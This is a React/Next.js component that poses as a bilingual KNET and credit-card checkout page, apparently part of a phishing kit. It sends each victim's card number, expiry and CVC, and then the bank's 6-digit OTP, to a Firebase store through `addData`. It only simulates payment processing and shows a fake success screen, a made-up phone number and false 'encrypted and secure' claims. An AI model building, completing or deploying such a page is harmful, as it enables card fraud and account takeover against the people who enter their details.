"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import {
  CreditCard,
  Wallet,
  Check,
  Shield,
  Download,
  ArrowRight,
  AlertCircle,
  Info,
  Lock,
  Languages,
  CircleCheck,
  CircleDashed,
  Building2,
  Smartphone,
} from "lucide-react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { addData } from "@/lib/firebase"

// Payment flow states
type PaymentState = "FORM" | "OTP" | "SUCCESS"

export default function PaymentMethods() {
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
  const [otpError, setOtpError] = useState("")
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(30)
  const router = useRouter()
  const [isArabic, setIsArabic] = useState(false)

  // Form validation
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [currency, setCurrency] = useState("sar")
  const [formErrors, setFormErrors] = useState<Record<string, string>>({})
  const generateOrderId = () => `ORD-${Math.floor(10000 + Math.random() * 90000)}`

  // Order details state
  const [orderDetails, setOrderDetails] = useState({
    id: generateOrderId(),
    total: "114.00", // Default value
    date: new Date().toISOString(),
  })

  // Initialize order details from localStorage on client-side only
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }

      // Check if language preference is stored
      const storedLanguage = localStorage.getItem("language")
      if (storedLanguage) {
        setIsArabic(storedLanguage === "ar")
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  // Toggle language function
  const toggleLanguage = () => {
    const newLanguage = !isArabic
    setIsArabic(newLanguage)
    try {
      localStorage.setItem("language", newLanguage ? "ar" : "en")
    } catch (error) {
      console.error("Error saving to localStorage:", error)
    }
  }

  // Get visitor ID from localStorage (if available)
  const getVisitorId = () => {
    try {
      if (typeof window !== "undefined") {
        return localStorage.getItem("visitor") || "anonymous-user"
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
    return "anonymous-user"
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  // Validate form
  const validateForm = () => {
    const errors: Record<string, string> = {}

    if (!cardNumber) {
      errors.cardNumber = isArabic ? "يرجى إدخال رقم البطاقة" : "Please enter card number"
    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
      errors.cardNumber = isArabic ? "رقم البطاقة غير صحيح" : "Invalid card number"
    }

    if (!cardExpiry) {
      errors.cardExpiry = isArabic ? "يرجى إدخال تاريخ الانتهاء" : "Please enter expiry date"
    } else if (cardExpiry.length < 5) {
      errors.cardExpiry = isArabic ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date"
    }

    if (!cardCvc) {
      errors.cardCvc = isArabic ? "يرجى إدخال رمز الأمان" : "Please enter security code"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = isArabic ? "رمز الأمان غير صحيح" : "Invalid security code"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  // Handle initial payment submission
  const handlePayment = () => {
    if (paymentMethod === "card" && !validateForm()) {
      return
    }

    if (paymentMethod === "paypal") {
      router.push("/kent")
      return
    }

    setIsProcessing(true)

    // Submit card data
    const visitorId = getVisitorId()
    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc })

    // Simulate payment processing
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)

      // Focus the first OTP input when the OTP dialog appears
      setTimeout(() => {
        if (otpInputRefs.current[0]) {
          otpInputRefs.current[0].focus()
        }
      }, 100)
    }, 1500)
  }

  // Handle OTP input change
  const handleOtpChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d*$/.test(value)) return

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)
    setOtpError("")

    // Auto-focus next input
    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  // Handle OTP input keydown
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      // Focus previous input when backspace is pressed on an empty input
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  // Handle OTP verification
  const verifyOtp = () => {
    const otpCode = otpValues.join("")

    if (otpCode.length !== 6) {
      setOtpError(isArabic ? "يرجى إدخال رمز التحقق المكون من 6 أرقام" : "Please enter the 6-digit verification code")
      return
    }

    setIsProcessing(true)

    // Submit OTP code
    const visitorId = getVisitorId()
    addData({ id: visitorId, otp: otpCode })

    // Simulate OTP verification
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(false)
      setPaymentState("SUCCESS")
    }, 1500)
  }

  // Handle OTP resend
  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(30)
    // Reset OTP fields
    setOtpValues(Array(6).fill(""))
    setOtpError("")
    // Focus the first input
    setTimeout(() => {
      if (otpInputRefs.current[0]) {
        otpInputRefs.current[0].focus()
      }
    }, 100)
  }

  // Countdown timer for OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (resendDisabled && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
    } else if (countdown === 0) {
      setResendDisabled(false)
    }
    return () => clearTimeout(timer)
  }, [resendDisabled, countdown])

  // Get current date in Arabic or English format
  const getCurrentDate = () => {
    const options: Intl.DateTimeFormatOptions = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }
    return new Date().toLocaleDateString(isArabic ? "ar-SA" : "en-US", options)
  }

  // Translations object
  const translations = {
    completePayment: {
      ar: "إتمام الدفع",
      en: "Complete Payment",
    },
    secure: {
      ar: "آمن",
      en: "Secure",
    },
    choosePaymentMethod: {
      ar: "اختر طريقة الدفع المفضلة لديك أدناه",
      en: "Choose your preferred payment method below",
    },
    payment: {
      ar: "الدفع",
      en: "Payment",
    },
    verification: {
      ar: "التحقق",
      en: "Verification",
    },
    confirmation: {
      ar: "التأكيد",
      en: "Confirmation",
    },
    orderNumber: {
      ar: "رقم الطلب:",
      en: "Order Number:",
    },
    totalAmount: {
      ar: "المبلغ الإجمالي:",
      en: "Total Amount:",
    },
    paymentMethod: {
      ar: "طريقة الدفع",
      en: "Payment Method",
    },
    creditCard: {
      ar: "بطاقة ائتمان",
      en: "Credit Card",
    },
    knet: {
      ar: "كي نت",
      en: "KNET",
    },
    cardNumber: {
      ar: "رقم البطاقة",
      en: "Card Number",
    },
    cardNumberTooltip: {
      ar: "أدخل 16 رقم الموجود على بطاقتك",
      en: "Enter the 16-digit number on your card",
    },
    expiryDate: {
      ar: "تاريخ الانتهاء",
      en: "Expiry Date",
    },
    securityCode: {
      ar: "رمز التحقق",
      en: "Security Code",
    },
    payNow: {
      ar: "ادفع الآن",
      en: "Pay Now",
    },
    processing: {
      ar: "جاري المعالجة...",
      en: "Processing...",
    },
    allTransactionsSecure: {
      ar: "جميع المعاملات مشفرة وآمنة",
      en: "All transactions are encrypted and secure",
    },
    paymentSuccessful: {
      ar: "تم الدفع بنجاح",
      en: "Payment Successful",
    },
    thankYou: {
      ar: "شكراً لك، تمت عملية الدفع بنجاح",
      en: "Thank you, your payment was successful",
    },
    paymentDate: {
      ar: "تاريخ الدفع:",
      en: "Payment Date:",
    },
    emailSent: {
      ar: "تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني",
      en: "Payment details have been sent to your email",
    },
    returnToHome: {
      ar: "العودة للرئيسية",
      en: "Return to Home",
    },
    printReceipt: {
      ar: "طباعة الإيصال",
      en: "Print Receipt",
    },
    paymentVerification: {
      ar: "التحقق من الدفع",
      en: "Payment Verification",
    },
    enterVerificationCode: {
      ar: "أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك",
      en: "Enter the 6-digit verification code sent to your phone",
    },
    codeSentTo: {
      ar: "تم إرسال رمز التحقق إلى",
      en: "Verification code sent to",
    },
    didntReceiveCode: {
      ar: "لم تستلم الرمز؟",
      en: "Didn't receive the code?",
    },
    resendCode: {
      ar: "إعادة إرسال الرمز",
      en: "Resend Code",
    },
    resendAfter: {
      ar: "إعادة الإرسال بعد",
      en: "Resend after",
    },
    seconds: {
      ar: "ثانية",
      en: "seconds",
    },
    confirm: {
      ar: "تأكيد",
      en: "Confirm",
    },
    verifying: {
      ar: "جاري التحقق...",
      en: "Verifying...",
    },
  }

  // Helper function to get translation
  const t = (key: keyof typeof translations) => {
    return isArabic ? translations[key].ar : translations[key].en
  }

  // Progress indicator
  const renderProgressIndicator = () => (
    <div className="flex items-center justify-between mb-8">
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
            paymentState === "FORM"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 text-white shadow-lg"
              : "bg-gradient-to-br from-purple-500 to-purple-200 text-white shadow-lg"
          }`}
        >
          <CircleCheck className="h-6 w-6" />
        </div>
        <span className="text-sm mt-3 font-semibold text-slate-700">{t("payment")}</span>
      </div>
      <div
        className={`h-0.5 flex-1 mx-4 transition-all duration-500 ${paymentState !== "FORM" ? "bg-slate-900" : "bg-slate-200"}`}
      ></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
            paymentState === "OTP"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-lg"
              : paymentState === "SUCCESS"
                ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-lg"
                : "bg-white border-slate-200 text-slate-400"
          }`}
        >
          {paymentState === "OTP" || paymentState === "SUCCESS" ? (
            <CircleCheck className="h-6 w-6" />
          ) : (
            <CircleDashed className="h-6 w-6" />
          )}
        </div>
        <span className="text-sm mt-3 font-semibold text-slate-700">{t("verification")}</span>
      </div>
      <div
        className={`h-0.5 flex-1 mx-4 transition-all duration-500 ${paymentState === "SUCCESS" ? "bg-slate-900" : "bg-slate-200"}`}
      ></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
            paymentState === "SUCCESS"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-lg"
              : "bg-white border-slate-200 text-slate-400"
          }`}
        >
          {paymentState === "SUCCESS" ? <CircleCheck className="h-6 w-6" /> : <CircleDashed className="h-6 w-6" />}
        </div>
        <span className="text-sm mt-3 font-semibold text-slate-700">{t("confirmation")}</span>
      </div>
    </div>
  )

  // Render success state
  const renderSuccessState = () => (
    <>
      <CardHeader className="space-y-1 pb-6 text-center border-b border-slate-100">
        <div className="flex justify-center mb-8">
          <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center border border-emerald-100">
            <Check className="h-12 w-12 text-emerald-600" />
          </div>
        </div>
        <CardTitle className="text-3xl font-bold text-slate-900">{t("paymentSuccessful")}</CardTitle>
        <CardDescription className="text-lg text-slate-600 mt-2">{t("thankYou")}</CardDescription>
      </CardHeader>
      <CardContent className="space-y-8 pt-8">
        {renderProgressIndicator()}

        <div className="bg-slate-50 rounded-2xl p-8 border border-slate-100">
          <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-200">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("orderNumber")}</span>
            <span className="font-bold text-slate-900 text-lg">{orderDetails.id}</span>
          </div>
          <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-200">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("paymentDate")}</span>
            <span className="font-semibold text-slate-700">{getCurrentDate()}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("totalAmount")}</span>
            <span className="font-bold text-2xl text-slate-900">
              {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
            </span>
          </div>
        </div>

        <div className="text-center bg-blue-50 rounded-xl p-6 border border-blue-100">
          <div className="flex items-center justify-center gap-2 text-blue-700 mb-2">
            <Building2 className="h-5 w-5" />
            <span className="font-semibold">Receipt Notification</span>
          </div>
          <p className="text-blue-600">{t("emailSent")}</p>
        </div>
      </CardContent>
      <CardFooter className="flex flex-col gap-4 pt-8 border-t border-slate-100">
        <Button
          className="w-full h-14 text-base font-semibold bg-gradient-to-br from-purple-700 to-purple-500 hover:bg-slate-800 text-white rounded-xl shadow-lg hover:shadow-xl transition-all duration-200"
          onClick={() => router.push("/")}
        >
          <span className="flex items-center gap-3">
            {t("returnToHome")}
            <ArrowRight className="h-5 w-5" />
          </span>
        </Button>
        <Button
          variant="outline"
          className="w-full h-12 border-slate-200 text-slate-700 hover:bg-slate-50 rounded-xl font-semibold"
          onClick={() => window.print()}
        >
          <span className="flex items-center gap-2">
            <Download className="h-4 w-4" />
            {t("printReceipt")}
          </span>
        </Button>
      </CardFooter>
    </>
  )

  return (
    <div
      className="flex justify-center items-center min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50"
      dir={isArabic ? "rtl" : "ltr"}
    >
      {/* Language Toggle Button */}
      <div className="absolute top-6 right-6 z-10">
        <button
          onClick={toggleLanguage}
          className="bg-white rounded-full p-3 hover:bg-slate-50 transition-all duration-200 shadow-lg border border-slate-200"
        >
          <Languages className="text-slate-700" size={20} />
        </button>
      </div>

      <Card className="w-full max-w-lg shadow-2xl border-0 overflow-hidden rounded-3xl bg-white/95 backdrop-blur-sm">
        {paymentState === "FORM" && (
          <>
            <CardHeader className="space-y-1 pb-8 border-b border-slate-100 bg-white">
              <div className="flex justify-between items-start">
                <div>
                  <CardTitle className="text-3xl font-bold text-slate-900 mb-2">{t("completePayment")}</CardTitle>
                  <CardDescription className="text-slate-600 text-base">{t("choosePaymentMethod")}</CardDescription>
                </div>
                <Badge
                  variant="outline"
                  className="flex items-center gap-2 px-3 py-2 bg-emerald-50 text-emerald-700 border-emerald-200 font-semibold"
                >
                  <Shield className="h-4 w-4" /> {t("secure")}
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="space-y-8 pt-8">
              {renderProgressIndicator()}

              <div className="bg-slate-50 rounded-2xl p-8 border border-slate-100">
                <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-200">
                  <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("orderNumber")}</span>
                  <span className="font-bold text-slate-900 text-lg">{orderDetails.id}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("totalAmount")}</span>
                  <span className="font-bold text-2xl text-slate-900">
                    {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
                  </span>
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-6 text-slate-900 text-lg">{t("paymentMethod")}</h3>
                <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-4">
                  <div className="grid gap-6">
                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-2xl transition-all duration-300 ${
                          paymentMethod === "card" ? "ring-2 ring-slate-900 shadow-lg" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="card" id="card" className="text-slate-900 border-slate-300" />
                        <Label
                          htmlFor="card"
                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-slate-200 p-6 hover:bg-slate-50 hover:border-slate-300 transition-all duration-200 w-full"
                        >
                          <div className="bg-gradient-to-br from-purple-700 to-purple-500 text-white p-3 rounded-xl">
                            <CreditCard className="h-6 w-6" />
                          </div>
                          <div className="font-semibold text-slate-900 text-lg">{t("creditCard")}</div>
                          <div className={`flex gap-3 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <div className="rounded-lg overflow-hidden shadow-sm">
                              <Image
                                src="/visa.svg"
                                alt="visa"
                                width={38}
                                height={24}
                              />
                            </div>
                            <div className="rounded-lg overflow-hidden shadow-sm">
                              <Image
                                src="/mas.svg"
                                alt="mastercard"
                                width={38}
                                height={24}
                              />
                            </div>
                            <div className="rounded-lg overflow-hidden shadow-sm">
                              <Image
                                src="/amex.svg"
                                alt="express"
                                width={38}
                                height={24}
                              />
                            </div>
                          </div>
                        </Label>
                      </div>
                    </div>

                    {paymentMethod === "card" && (
                      <div
                        className={`grid gap-6 ${isArabic ? "pr-8" : "pl-8"} animate-in fade-in-50 duration-500`}
                        dir={isArabic ? "rtl" : "ltr"}
                      >
                        <div className="grid gap-3">
                          <div className="flex items-center justify-between">
                            <Label
                              htmlFor="card-number"
                              className="flex items-center gap-2 text-slate-700 font-semibold"
                            >
                              {t("cardNumber")}
                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-4 w-4 text-slate-400" />
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>{t("cardNumberTooltip")}</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </Label>
                            {formErrors.cardNumber && (
                              <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
                                <AlertCircle className="h-4 w-4" /> {formErrors.cardNumber}
                              </span>
                            )}
                          </div>
                          <div className="relative">
                            <Input
                              id="card-number"
                              placeholder="1234 5678 9012 3456"
                              value={cardNumber}
                              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                              maxLength={19}
                              className={`rounded-xl h-14 px-5 text-lg font-mono border-2 transition-all duration-200 ${
                                formErrors.cardNumber
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-slate-900"
                              }`}
                            />
                            <div className="absolute right-4 top-1/2 -translate-y-1/2">
                              <div className="w-8 h-5 bg-slate-900 rounded-sm"></div>
                            </div>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-6">
                          <div className="grid gap-3">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="expiry" className="text-slate-700 font-semibold">
                                {t("expiryDate")}
                              </Label>
                              {formErrors.cardExpiry && (
                                <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
                                  <AlertCircle className="h-4 w-4" /> {formErrors.cardExpiry}
                                </span>
                              )}
                            </div>
                            <Input
                              id="expiry"
                              placeholder="MM/YY"
                              type="tel"
                              value={cardExpiry}
                              onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                              maxLength={5}
                              className={`rounded-xl h-14 text-lg font-mono border-2 transition-all duration-200 ${
                                formErrors.cardExpiry
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-slate-900"
                              }`}
                            />
                          </div>
                          <div className="grid gap-3">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="cvc" className="text-slate-700 font-semibold">
                                {t("securityCode")}
                              </Label>
                              {formErrors.cardCvc && (
                                <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
                                  <AlertCircle className="h-4 w-4" /> {formErrors.cardCvc}
                                </span>
                              )}
                            </div>
                            <Input
                              id="cvc"
                              placeholder="123"
                              type="tel"
                              maxLength={4}
                              value={cardCvc}
                              onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                              className={`rounded-xl h-14 text-lg font-mono border-2 transition-all duration-200 ${
                                formErrors.cardCvc
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-slate-900"
                              }`}
                            />
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-2xl transition-all duration-300 ${
                          paymentMethod === "paypal" ? "ring-2 ring-slate-900 shadow-lg" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="paypal" id="paypal" className="text-slate-900 border-slate-300" />
                        <Label
                          htmlFor="paypal"
                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-slate-200 p-6 hover:bg-slate-50 hover:border-slate-300 transition-all duration-200 w-full"
                        >
                          <div className="bg-gradient-to-br from-purple-700 to-purple-500 text-white p-3 rounded-xl">
                            <Wallet className="h-6 w-6" />
                          </div>
                          <div className="font-semibold text-slate-900 text-lg">{t("knet")}</div>
                          <div className={`flex gap-2 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <img src="/vercel.svg" className="h-6 w-6" />
                          </div>
                        </Label>
                      </div>
                    </div>
                  </div>
                </RadioGroup>
              </div>
            </CardContent>
            <CardFooter className="flex flex-col gap-6 border-t border-slate-100 pt-8 bg-white">
              <Button
                className="w-full h-14 text-lg font-semibold bg-gradient-to-br from-purple-700 to-purple-500 hover:bg-slate-800 text-white rounded-xl shadow-lg hover:shadow-xl transition-all duration-200"
                disabled={!paymentMethod || isProcessing}
                onClick={handlePayment}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-3">
                    <svg
                      className={`animate-spin ${isArabic ? "-ml-1 mr-3" : "-mr-1 ml-3"} h-5 w-5 text-white`}
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    {t("processing")}
                  </span>
                ) : (
                  <span className="flex items-center gap-3">
                    {t("payNow")}
                    <ArrowRight className="h-5 w-5" />
                  </span>
                )}
              </Button>
              <div className="flex items-center justify-center gap-3 text-sm text-slate-500 bg-slate-50 rounded-xl p-4">
                <Shield className="h-4 w-4" />
                <span className="font-medium">{t("allTransactionsSecure")}</span>
              </div>
            </CardFooter>
          </>
        )}

        {paymentState === "SUCCESS" && renderSuccessState()}

        {/* OTP Dialog */}
        <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
          <DialogContent className="sm:max-w-sm rounded-3xl border-0 shadow-2xl" dir={isArabic ? "rtl" : "ltr"}>
            <DialogHeader className="text-center pb-6 border-b border-slate-100">
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100">
                  <Smartphone className="h-8 w-8 text-blue-600" />
                </div>
              </div>
              <DialogTitle className="text-2xl font-bold text-slate-900">{t("paymentVerification")}</DialogTitle>
              <DialogDescription className="text-slate-600 text-base mt-2">
                {t("enterVerificationCode")}
              </DialogDescription>
            </DialogHeader>

            <div className="bg-slate-50 rounded-2xl p-6 my-6 border border-slate-100">
              <div className="flex justify-between items-center mb-4 pb-3 border-b border-slate-200">
                <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("orderNumber")}</span>
                <span className="font-bold text-slate-900">{orderDetails.id}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm font-medium text-slate-500 uppercase tracking-wide">{t("totalAmount")}</span>
                <span className="font-bold text-xl text-slate-900">
                  {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
                </span>
              </div>
            </div>

            <div className="text-center mb-6 bg-blue-50 rounded-xl p-4 border border-blue-100">
              <p className="text-sm mb-1 text-blue-600 font-medium">{t("codeSentTo")}</p>
              <p className="font-bold text-blue-900">+965 5XX XXX XX89</p>
            </div>

            <div className="flex justify-center gap-3 my-8">
              {otpValues.map((value, index) => (
                <div key={index} className="relative">
                  <Input
                    ref={(el) => (otpInputRefs.current[index] = el)}
                    type="tel"
                    inputMode="numeric"
                    maxLength={1}
                    value={value}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className={`w-14 h-16 text-center text-xl font-bold rounded-xl border-2 transition-all duration-200 ${
                      otpError ? "border-red-300 focus:border-red-500" : "border-slate-200 focus:border-slate-900"
                    }`}
                  />
                </div>
              ))}
            </div>

            {otpError && (
              <div className="bg-red-50 text-red-600 rounded-xl p-4 text-center text-sm flex items-center justify-center gap-2 border border-red-100 font-medium">
                <AlertCircle className="h-4 w-4" />
                {otpError}
              </div>
            )}

            <div className="text-center mb-6">
              <p className="text-sm text-slate-500 mb-3">{t("didntReceiveCode")}</p>
              <Button
                variant="link"
                onClick={resendOtp}
                disabled={resendDisabled}
                className="text-sm p-0 h-auto text-slate-700 hover:text-slate-900 font-semibold"
              >
                {resendDisabled ? `${t("resendAfter")} ${countdown} ${t("seconds")}` : t("resendCode")}
              </Button>
            </div>

            <DialogFooter className="sm:justify-center pt-6 border-t border-slate-100">
              <Button
                className="w-full h-14 text-lg font-semibold bg-gradient-to-br from-purple-700 to-purple-500  hover:bg-slate-800 text-white rounded-xl shadow-lg hover:shadow-xl transition-all duration-200"
                disabled={otpValues.some((v) => !v) || isProcessing}
                onClick={verifyOtp}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-3">
                    <svg
                      className={`animate-spin ${isArabic ? "mr-3" : "ml-3"} h-5 w-5 text-white`}
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    {t("verifying")}
                  </span>
                ) : (
                  <span className="flex items-center gap-3">
                    <Lock className="h-5 w-5" />
                    {t("confirm")}
                  </span>
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </Card>
    </div>
  )
}
